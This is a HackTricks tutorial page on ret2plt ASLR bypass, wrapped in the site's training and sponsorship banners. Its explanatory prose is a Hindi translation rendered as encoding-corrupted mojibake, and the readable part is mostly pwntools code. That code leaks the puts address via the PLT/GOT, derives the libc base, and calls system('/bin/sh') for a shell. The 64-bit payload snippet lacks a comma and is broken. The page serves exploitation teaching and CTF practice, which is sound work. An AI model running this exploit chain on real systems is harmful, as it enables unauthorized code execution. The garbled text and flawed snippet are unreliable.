# Ret2plt

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рд▓рдХреНрд╖реНрдп **PLT рд╕реЗ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рдирд╛** рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ ASLR рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк libc рд╕реЗ `puts` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **`libc` рдХрд╛ рдмреЗрд╕ рдХрд╣рд╛рдВ рд╣реИ, рдпрд╣ рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдЬреИрд╕реЗ **`system`** рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдСрдлрд╕реЗрдЯреНрд╕ рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ `pwntools` рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ ([**рдпрд╣рд╛рдВ рд╕реЗ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`puts`** (PLT рд╕реЗ рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП) рдХреЛ GOT (рдЧреНрд▓реЛрдмрд▓ рдСрдлрд╕реЗрдЯ рдЯреЗрдмрд▓) рдореЗрдВ рд╕реНрдерд┐рдд `puts` рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдЬрдм `puts` `puts` рдХреЗ GOT рдПрдВрдЯреНрд░реА рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ **рдПрдВрдЯреНрд░реА рдореЗрдореЛрд░реА рдореЗрдВ `puts` рдХрд╛ рд╕рдЯреАрдХ рдкрддрд╛ рд░рдЦреЗрдЧреА**ред

рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреИрд╕реЗ `main` рдХрд╛ рдкрддрд╛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЬрдм `puts` рдЕрдкрдиреА рдирд┐рд╖реНрдкрд╛рджрди рд╕рдорд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдмрд╛рдЗрдирд░реА `main` рдХреЛ рдлрд┐рд░ рд╕реЗ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рдмрдЬрд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рд╡рд╣ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдЬрд╛рдП** (рдЗрд╕рд▓рд┐рдП рд▓реАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкрддрд╛ рдорд╛рдиреНрдп рд░рд╣реЗрдЧрд╛)ред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдмрд╛рдЗрдирд░реА рдХреЛ PIE рдХреЗ рд╕рд╛рде рд╕рдВрдХрд▓рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рдпрд╛ рдЖрдкрдХреЛ **PIE рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд▓реАрдХ рдорд┐рд▓рд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** рддрд╛рдХрд┐ PLT, GOT рдФрд░ `main` рдХреЗ рдкрддреЗ рдХреЛ рдЬрд╛рди рд╕рдХреЗрдВред рдЕрдиреНрдпрдерд╛, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ PIE рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
{% endhint %}

рдЖрдк [**рдЗрд╕ рдмрд╛рдпрдкрд╛рд╕ рдХрд╛ рдкреВрд░рд╛ рдЙрджрд╛рд╣рд░рдг рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)ред рдпрд╣ рдЙрд╕ рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдЕрдВрддрд┐рдо рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдерд╛:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд▓реЗрдХрд┐рди рдХреЛрдИ PIE рдирд╣реАрдВ, рдкрд╣рд▓рд╛ рдХрджрдо рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЛ рднрд░рдирд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рдХреИрдирд░реА рдХрд╛ рдмрд╛рдЗрдЯ 0x00 рди рд╣реЛ рдЬрд╛рдП, рдлрд┐рд░ puts рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рд▓реАрдХ рдХрд░реЗрдВред рдХреИрдирд░реА рдХреЗ рд╕рд╛рде рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ puts рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдлрд┐рд░ `system('/bin/sh')` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ ROP рдЧреИрдЬреЗрдЯред
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо, рдХреЛрдИ рдХреИрдирд░реА рдирд╣реАрдВ, рдПрдХ рдЪрд╛рдЗрд▓реНрдб рдлрдВрдХреНрд╢рди рд╕реЗ рдореБрдЦреНрдп рдореЗрдВ рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛред GOT рд╕реЗ puts рдХреЗ рдкрддреЗ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯ рдФрд░ рдлрд┐рд░ рдПрдХ рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВред

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
